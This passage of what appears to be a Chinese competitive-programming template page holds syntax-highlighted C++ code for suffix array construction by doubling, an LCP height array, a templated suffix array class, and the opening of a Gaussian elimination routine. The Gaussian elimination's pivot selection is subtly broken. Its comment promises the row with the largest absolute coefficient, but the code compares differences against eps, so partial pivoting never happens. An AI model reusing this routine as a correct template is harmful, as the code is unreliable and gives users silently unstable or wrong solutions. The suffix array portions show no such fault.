punctuation">,</span> bk<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">da</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>r<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>sa<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">,</span> <span class="token keyword">int</span> m<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> p<span class="token punctuation">,</span> <span class="token operator">*</span>x <span class="token operator">=</span> ta<span class="token punctuation">,</span> <span class="token operator">*</span>y <span class="token operator">=</span> tb<span class="token punctuation">,</span> <span class="token operator">*</span>t<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> r<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> bk<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> sa<span class="token punctuation">[</span><span class="token operator">--</span>bk<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j <span class="token operator">&lt;&lt;=</span><span class="token number">1</span><span class="token punctuation">,</span> m <span class="token operator">=</span> p<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> n <span class="token operator">-</span> j<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> y<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token keyword">if</span><span class="token punctuation">(</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> j<span class="token punctuation">)</span> y<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> j<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> bk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> bk<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> n<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> sa<span class="token punctuation">[</span><span class="token operator">--</span>bk<span class="token punctuation">[</span>x<span class="token punctuation">[</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span>t <span class="token operator">=</span> x<span class="token punctuation">,</span> x <span class="token operator">=</span> y<span class="token punctuation">,</span> y <span class="token operator">=</span> t<span class="token punctuation">,</span> x<span class="token punctuation">[</span>sa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            x<span class="token punctuation">[</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cmp</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> sa<span class="token punctuation">[</span>i<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span><span class="token operator">?</span> p<span class="token operator">-</span><span class="token number">1</span><span class="token operator">:</span> p<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">rank</span> <span class="token expression">rrank</span></span><span class="token keyword">int</span> rank<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> sa<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">,</span> height<span class="token punctuation">[</span>maxn<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">calheight</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span>r<span class="token punctuation">,</span> <span class="token keyword">int</span> <span class="token operator">*</span>sa<span class="token punctuation">,</span> <span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        rank<span class="token punctuation">[</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> height<span class="token punctuation">[</span>rank<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">)</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">?</span> k<span class="token operator">--</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span> j <span class="token operator">=</span> sa<span class="token punctuation">[</span>rank<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> r<span class="token punctuation">[</span>i <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>j <span class="token operator">+</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//若k>0，从k-1开始找最长公共前缀。</span>    <span class="token keyword">return</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p><em>2</em>. 后缀数组模板（倍增）<br><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">T</span> <span class="token operator">=</span> <span class="token keyword">uint32_t</span><span class="token operator">></span><span class="token keyword">class</span> <span class="token class-name">__SA</span><span class="token punctuation">&#123;</span>    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">S</span><span class="token operator">></span>    <span class="token keyword">int</span> <span class="token function">cmp</span><span class="token punctuation">(</span>S <span class="token operator">&amp;&amp;</span>r<span class="token punctuation">,</span> <span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">,</span> <span class="token keyword">int</span> l<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span> r<span class="token punctuation">[</span>a<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>b<span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> r<span class="token punctuation">[</span>a <span class="token operator">+</span> l<span class="token punctuation">]</span> <span class="token operator">==</span> r<span class="token punctuation">[</span>b <span class="token operator">+</span> l<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">S</span><span class="token operator">></span>    <span class="token keyword">void</span> <span class="token function">_sa</span><span class="token punctuation">(</span>S <span class="token operator">&amp;&amp;</span>s<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> n<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> m<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token operator">++</span>n<span class="token punctuation">;</span>        sa <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        rk <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        ht <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">auto</span> <span class="token operator">&amp;&amp;</span>x <span class="token operator">=</span> rk<span class="token punctuation">;</span>        <span class="token keyword">auto</span> <span class="token operator">&amp;&amp;</span>y <span class="token operator">=</span> ht<span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token keyword">auto</span> wv <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">const</span> <span class="token keyword">auto</span> ws <span class="token operator">=</span> <span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token function">max</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> p<span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            ws<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            ws<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            ws<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> ws<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>            sa<span class="token punctuation">[</span><span class="token operator">--</span>ws<span class="token punctuation">[</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> p <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j <span class="token operator">*=</span> <span class="token number">2</span><span class="token punctuation">,</span> m <span class="token operator">=</span> p<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>p <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> n <span class="token operator">-</span> j<span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                y<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">>=</span> j<span class="token punctuation">)</span>                    y<span class="token punctuation">[</span>p<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> j<span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                wv<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">[</span>y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                ws<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                ws<span class="token punctuation">[</span>wv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                ws<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> ws<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span>                sa<span class="token punctuation">[</span><span class="token operator">--</span>ws<span class="token punctuation">[</span>wv<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> y<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>x<span class="token punctuation">.</span><span class="token function">swap</span><span class="token punctuation">(</span>y<span class="token punctuation">)</span><span class="token punctuation">,</span> p <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> x<span class="token punctuation">[</span>sa<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">,</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>                x<span class="token punctuation">[</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">cmp</span><span class="token punctuation">(</span>y<span class="token punctuation">,</span> sa<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> j<span class="token punctuation">)</span> <span class="token operator">?</span> p <span class="token operator">-</span> <span class="token number">1</span> <span class="token operator">:</span> p<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">public</span><span class="token operator">:</span>    std<span class="token double-colon punctuation">::</span>unique_ptr<span class="token operator">&lt;</span>T<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">></span> sa<span class="token punctuation">,</span> rk<span class="token punctuation">,</span> ht<span class="token punctuation">;</span>    <span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">S</span><span class="token operator">></span>    <span class="token function">__SA</span><span class="token punctuation">(</span>S <span class="token operator">&amp;&amp;</span>s<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> n<span class="token punctuation">,</span> <span class="token keyword">uint32_t</span> m <span class="token operator">=</span> <span class="token number">128</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token function">_sa</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> n<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i<span class="token punctuation">,</span> j<span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>            rk<span class="token punctuation">[</span>sa<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> ht<span class="token punctuation">[</span>rk<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> k<span class="token punctuation">)</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>k <span class="token operator">?</span> k<span class="token operator">--</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> j <span class="token operator">=</span> sa<span class="token punctuation">[</span>rk<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> s<span class="token punctuation">[</span>i <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">==</span> s<span class="token punctuation">[</span>j <span class="token operator">+</span> k<span class="token punctuation">]</span><span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span>                <span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">get_sa</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> sa<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">get_rk</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> rk<span class="token punctuation">[</span>idx<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>    <span class="token keyword">int</span> <span class="token function">get_ht</span><span class="token punctuation">(</span><span class="token keyword">int</span> idx<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> ht<span class="token punctuation">[</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre></p><h3 id="23-高斯消元"><a href="#23-高斯消元" class="headerlink" title="23. 高斯消元"></a>23. 高斯消元</h3><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">guass</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//读入系数</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token comment">//读入值</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> pivot <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span> j <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token comment">//选择一个当前位置系数绝对值最大的调换过来，防止误差</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">-</span> B<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> eps<span class="token punctuation">)</span>                pivot <span class="token operator">=</span> j<span class="token punctuation">;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span> <span class="token comment">//交换操作，要将所有的全部交换过来</span>            <span class="token keyword">double</span> t <span class="token operator">=</span> B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> B<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            B<span class="token punctuation">[</span>pivot<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">fabs</span><span class="token punctuation">(</span>B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> eps<span class="token punctuation">)</span>        <span class="token punctuation">&#123;</span> <span class="token comment">//如果该位置系数等于零，则0x=a，一定无解</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"No Solution\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j <span class="token operator">=</span> i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> n<span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span>            B<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">/=</span> B<span class="token punctuation">[</span>i<span 